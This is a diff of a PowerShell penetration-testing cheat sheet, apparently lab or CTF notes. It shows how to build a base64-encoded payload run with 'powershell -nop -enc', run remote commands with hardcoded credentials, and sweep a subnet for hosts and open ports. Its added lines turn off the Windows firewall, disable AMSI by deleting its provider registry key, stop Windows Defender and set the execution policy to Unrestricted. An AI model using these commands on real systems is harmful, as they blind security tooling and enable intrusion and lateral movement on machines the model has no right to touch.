@@ -11,8 +11,8 @@ Create a base64 payload to avoid bad characters.
 $ echo -n 'ping -n 2 10.10.14.2' | iconv -t utf-16le | base64 -w 0
 cABpAG4AZwAgAC0AbgAgADIAIAAxADAALgAxADAALgAxADQALgAyAA==
 
-# Run PowerShell Encoded
-Payload: cmd /c powershell -enc cABpAG4AZwAgAC0AbgAgADIAIAAxADAALgAxADAALgAxADQALgAyAA==
+# Run PowerShell with Encoded flag
+Payload: cmd /c powershell -nop -enc cABpAG4AZwAgAC0AbgAgADIAIAAxADAALgAxADAALgAxADQALgAyAA==
 
 ```
 
@@ -21,7 +21,6 @@ Payload: cmd /c powershell -enc cABpAG4AZwAgAC0AbgAgADIAIAAxADAALgAxADAALgAxADQA
 ```powershell
 $pass = ConvertTo-SecureString "aliceishere" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential("disco\\Alice", $pass)
-
 Invoke-Command -ComputerName disco -Credential $cred -ScriptBlock {whoami}
 ```
 
@@ -41,10 +40,10 @@ PS > 1..254 | ForEach-Object {Test-Connection -ComputerName "172.16.2.$_" -Count
 PS > 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("172.16.2.101",$)) "Port $ is open!"} 2>$null
 ```
 
-## **PowerShell**
+## PowerShell
 
 ```powershell
-# **PowerShell Directory**
+# PowerShell Directory
 c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
 # FIX THE VARIABLE PATH
@@ -57,13 +56,26 @@ set PATH=%SystemRoot%\system32;%SystemRoot%;
 Get-Childitem –Path C:\ -Include *filetosearch* -Recurse -ErrorAction SilentlyContinue
 ```
 
-## Firewall Disable
+## Windows Security
+### Disable Firewall
 
 ```powershell
 NetSh Advfirewall set allprofiles state off
 ```
 
-## **Can not run scripts?** Enable it!
+### Disable AMSI
+
+```PowerShell
+Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+```
+
+### Disable Defender
+
+```Powershell
+sc stop WinDefend
+```
+
+### Execution Policy
 
 ```powershell
 Set-ExecutionPolicy Unrestricted
